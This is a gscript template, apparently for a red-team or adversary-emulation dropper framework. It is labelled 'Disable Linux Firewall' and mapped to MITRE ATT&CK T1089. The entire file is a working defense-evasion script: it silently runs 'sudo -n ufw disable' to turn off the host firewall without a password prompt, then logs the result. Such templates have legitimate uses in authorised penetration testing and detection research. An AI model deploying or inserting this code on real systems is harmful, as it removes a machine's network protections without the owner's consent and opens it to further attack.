// Example gscript template
// Title: Disable Linux Firewall
// Author: Javier Rojas
// Purpose: Disables the linux firewall trying to log in as su without being prompted for password
// Tactic: low pirority to earlier
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1089

//priority:2
//timeout:10

function Deploy() {  
    console.log("Starting Disable Linux Firewall...");
    
    var response = G.exec.ExecuteCommand("sudo", ["-n", "ufw", "disable"]);
    console.log("Pid: "+response[0]);
    console.log("stdout: "+response[1]);
    
    if(response[3]!=0){
        console.log("stderr: "+response[2]);
        console.log("exit code: "+response[3]);
        console.log("go errors: "+Dump(response[4]));
    }
    
    console.log("Done Disable Linux Firewall!");
    return true;
}
